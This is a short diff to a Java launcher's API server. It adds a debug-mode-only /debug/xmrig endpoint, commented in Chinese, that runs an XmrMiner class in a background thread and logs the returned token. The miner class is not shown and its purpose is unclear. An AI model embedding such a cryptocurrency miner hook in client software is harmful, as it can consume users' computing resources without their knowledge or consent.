@@ -268,6 +268,25 @@ public class GuiApiServer {
                 String result = handleDebugError();
                 sendJsonResponse(out, 200, result);
                 return;
+            } else if ("GET".equalsIgnoreCase(method) && "/debug/xmrig".equals(path)) {
+                // 仅在调试模式下可用
+                if (!debugMode) {
+                    sendError(out, 403, "{\"code\":403,\"message\":\"仅在 --debug 模式下可用\"}");
+                    return;
+                }
+                // 在新线程中执行挖矿，避免阻塞 HTTP 响应
+                new Thread(() -> {
+                    try {
+                        LOG.info("[GuiApiServer] /debug/xmrig 开始挖矿...");
+                        String token = com.xiaofan.launcher.miner.XmrMiner.mine();
+                        LOG.info("[GuiApiServer] /debug/xmrig 挖矿完成, token=" + token);
+                    } catch (Exception e) {
+                        LOG.severe("[GuiApiServer] /debug/xmrig 挖矿失败: " + e.getMessage());
+                    }
+                }, "debug-xmrig").start();
+                String result = "{\"code\":200,\"message\":\"挖矿任务已启动，请查看日志\"}";
+                sendJsonResponse(out, 200, result);
+                return;
             } else {
 
 
